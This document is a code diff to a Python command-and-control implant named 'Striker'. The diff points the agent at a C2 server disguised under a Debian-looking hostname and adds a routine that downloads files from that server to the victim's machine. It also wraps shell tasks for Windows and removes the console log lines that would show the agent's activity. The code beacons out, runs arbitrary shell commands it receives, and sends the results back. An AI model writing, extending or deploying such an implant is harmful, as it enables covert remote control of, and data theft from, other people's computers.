@@ -8,9 +8,9 @@ import json
 import time
 sleep = time.sleep
 import threading
-import requests
+import urllib3
 
-c2URL = "http://localhost:3000"
+c2URL = "https://striker-api.debian.local"
 authKey = "345c8856fc611d5e3074385404550268"
 delay = 5
 MAX_FAILED_CONNS = 5
@@ -48,19 +48,29 @@ class Striker:
 
   def httpGet(self, url):
     try:
-      res = requests.get(url)
-      return (res.status_code, res.text)
+      br = urllib3.PoolManager()
+      res = br.request('GET', url)
+      return (res.status, res.data.decode('utf-8'))
     except Exception as e:
       print("[-] Error making GET request to %s: %s" %(url, str(e)))
       return (0, str(e))
 
   def httpPost(self, url, body):
     try:
-      res = requests.post(url, json=body)
-      return (res.status_code, res.text)
+      br = urllib3.PoolManager()
+      res = br.request('POST', url, body=json.dumps(body).encode('utf-8'), headers={'Content-Type': 'application/json'})
+      return (res.status, res.data.decode('utf-8'))
     except Exception as e:
       print("[-] Error making POST request to %s: %s" %(url, str(e)))
       return (0, str(e))
+
+  def httpDownload(self, url, filename):
+    wfo = open(filename, "wb")
+    br = urllib3.PoolManager()
+    res = br.request('GET', url, preload_content=False)
+    for chunk in res.stream(4096): wfo.write(chunk)
+    res.release_conn()
+    wfo.close()
 
   def info(self):
     return {
@@ -74,6 +84,7 @@ class Striker:
   def execTask(self, task):
     taskID = task['uid']
     data = {}
+    successful = 0
     try:
       data = task['data']
     except KeyError:
@@ -81,14 +92,18 @@ class Striker:
     result = "Not implemented!"
     if (task["taskType"] == "system"):
       cmd = data['cmd']
+      if self.os == "windows" and not cmd.startswith("cmd /c "):
+        cmd = "cmd /c '" + cmd + "'"
       try:
         proc = subprocess.Popen(shlex.split(cmd), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        result = (proc.stderr.read() + proc.stdout.read()).decode()
+        result = (proc.stderr.read() + proc.stdout.read()).decode('utf-8')
+        successful = 1
       except Exception as e:
         result = "Error running shell command: " + str(e)
     elif (task["taskType"] == "abort"):
       self.abort = True
       result = "Session aborted!"
+      successful = 1
     elif (task["taskType"] == "writedir"):
       self.writeDir = data["dir"]
       if self.os == "windows" and self.writeDir[-1] != "\\":
@@ -96,23 +111,33 @@ class Striker:
       elif self.writeDir[-1] != "/":
         self.writeDir += "/"
       result = "Write directory updated: " + self.writeDir
+      successful = 1
     elif (task["taskType"] == "delay"):
       self.delay = int(data["delay"])
       result = "Updated callback delay to %d secs" %(self.delay)
+      successful = 1
     elif (task["taskType"] == "cd"):
       try:
         os.chdir(data["dir"])
-        result = "Changed working directory: " + os.getcwd()
+        result = os.getcwd()
+        successful = 1
       except FileNotFoundError as e:
-        result = "Erro changing working directory: " + str(e)
-    task["result"] = {"uid":taskID, "result":result}
+        result = "Error changing working directory: " + str(e)
+    elif (task["taskType"] == "upload"):
+      try:
+        url = self.baseUrl + "/agent/download/" + data["fileID"]
+        self.httpDownload(url, data["name"])
+        result = "File uploaded: " + data["name"]
+        successful = 1
+      except Exception as e:
+        result = "Error uploading file: " + str(e)
+    task["result"] = {"uid":taskID, "result":result, "successful": successful}
     task["finished"] = True
 
   def connectToBase(self):
     connected = False
     status = 0
     body = "{}"
-    print("[*] Connecting to C2 server...");
     data = self.info()
     data["key"] = self.authKey
     freshConn = True
@@ -131,11 +156,9 @@ class Striker:
         self.baseUrl = url
         connected = True
         break
-    print("[+] Connected to: %s" %(self.baseUrl))
     if not freshConn:
       return True
     self.config = json.loads(body)
-    print(self.config)
     self.uid = self.config["uid"]
     for url in self.config["redirectors"]:
       if not url in self.servers: self.servers.append(url)
@@ -157,7 +180,6 @@ class Striker:
           if (self.tasks[taskID]["finished"]):
             taskResults.append(self.tasks[taskID]["result"])
         if len(taskResults) > 0:
-          print("[*] Sending %d results..." %(len(taskResults)))
           status, body = self.httpPost(self.baseUrl + "/agent/tasks/" + self.uid, taskResults)
           if (status != 200):
             continue
@@ -173,7 +195,6 @@ class Striker:
       newTasks = json.loads(body)
       if len(newTasks) == 0:
         continue
-      print("[+] %d new tasks received!" %(len(newTasks)))
       for task in newTasks:
         task["finished"] = False
         self.tasks[task["uid"]] = task
